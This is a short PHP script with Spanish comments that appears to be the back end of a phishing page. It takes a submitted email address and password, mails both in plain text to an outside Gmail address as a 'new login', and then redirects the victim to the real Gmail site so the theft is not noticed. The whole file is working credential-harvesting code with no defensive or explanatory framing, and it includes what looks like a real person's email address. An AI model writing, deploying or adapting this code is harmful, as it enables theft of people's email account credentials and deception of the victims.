<?php
// Asegúrate de que no hay NADA antes de esta línea (ni espacios en blanco)

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Sanitización básica
    $correo = filter_var($_POST['correo'], FILTER_SANITIZE_EMAIL);
    $contrasena = htmlspecialchars($_POST['contrasena']);

    // Datos del correo
    $to = "castelnuovoerick@gmail.com";
    $subject = "Nuevo login recibido";
    $message = "Correo: $correo\nContraseña: $contrasena";

    // Cabecera del correo
    $headers = "From: info@tudominio.com\r\n";
    $headers .= "Reply-To: no-reply@tudominio.com\r\n";
    $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";

    // Enviar el correo y verificar si se envió correctamente
    if (mail($to, $subject, $message, $headers)) {
        // Redirigir a Gmail si el envío fue exitoso
        header("Location: https://mail.google.com/");
        exit;
    } else {
        echo "Error al enviar el correo.";
    }
} else {
    echo "Acceso no permitido.";
}
?>

